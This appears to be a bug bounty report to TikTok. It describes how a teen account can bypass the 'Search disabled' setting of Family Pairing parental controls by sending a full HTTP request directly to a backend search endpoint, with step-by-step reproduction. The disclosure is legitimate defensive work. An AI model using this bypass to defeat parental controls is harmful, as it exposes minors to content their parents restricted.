**Program:** Tiktok

**Title:** Teen account can bypass “Search disabled” restriction via backend search endpoint 
## Description:

When a parent disables search for a teen account using Family Pairing, the teen is still able to retrieve search results by directly calling a backend search endpoint. This bypasses the intended restriction and allows searching despite the feature being disabled in the UI.

## Steps to Reproduce

1. Set up Family Pairing on tiktok app between a parent and a teen account
3. From the parent account, disable Search for the teen
4. Log in as the teen account and observe the account is not allowed to search
5. Now as the teen account owner run the graph ql request below (Note: The search keyword is specified in the URL parameter: keyword=[SEARCH_TERM]
Example: keyword=iamjonah (replace with whatever you want to search)):
```
GET /api/search/general/full/?WebIdLastTime=1770199009&aid=1988&app_language=en-GB&app_name=tiktok_web&browser_language=en-GB&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F144.0.0.0%20Safari%2F537.36&channel=tiktok_web&client_ab_versions=70508271%2C72437276%2C73720541%2C74782564%2C74926160%2C75004380%2C75004399%2C75030793%2C75077940%2C75183088%2C75194323%2C75195482%2C75204946%2C75224160%2C75227407%2C75236328%2C75252005%2C75276186%2C75308229%2C75323596%2C75331914%2C75337540%2C75350406%2C75360574%2C75373599%2C75388125%2C75405131%2C75414538%2C75423620%2C75484880%2C70138197%2C70156809%2C70405643%2C71057832%2C71200802%2C71381811%2C71516509%2C71803300%2C71962127%2C72360691%2C72408100%2C72854054%2C72892778%2C73004916%2C73171280%2C73208420%2C73989921%2C74276218%2C74844724%2C75330961&cookie_enabled=true&count=12&cursor=0&data_collection_enabled=true&device_id=[REDACTED]&device_platform=web_pc&device_type=web_h265&focus_state=true&from_page=search&history_len=3&is_fullscreen=false&is_non_personalized_search=0&is_page_visible=true&keyword=iamjonah&odinId=[REDACTED]&offset=0&os=windows&priority_region=NG&referer=&region=NG&root_referer=https%3A%2F%2Fwww.tiktok.com%2F%40boymayola%2Fvideo%2F7586338978903657748&screen_height=720&screen_width=1280&search_source=normal_search&tz_name=Africa%2FLagos&user_is_login=true&verifyFp=[REDACTED]&web_search_code=%7B%22tiktok%22%3A%7B%22client_params_x%22%3A%7B%22search_engine%22%3A%7B%22ies_mt_user_live_video_card_use_libra%22%3A1%2C%22mt_search_general_user_live_card%22%3A1%7D%7D%2C%22search_server%22%3A%7B%7D%7D%7D&webcast_language=en-GB&msToken=[REDACTED]&X-Bogus=[REDACTED]&X-Gnarly=[REDACTED] HTTP/2
Host: www.tiktok.com
Cookie: cookie-consent= [REDACTED]
Sec-Ch-Ua-Platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.tiktok.com/search?q=sft&t=1770313420151
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=1, i
```
6. Observe that search results are returned successfully

## Impact:
A teen account can bypass Family Pairing search restrictions and retrieve search results via a backend endpoint, undermining parental controls and exposing minors to content their parents explicitly disabled
**weakness**: Improper access control

**severity calculation**: AC: Low - PR: None - confidentiality: low - Scope: Unchanged
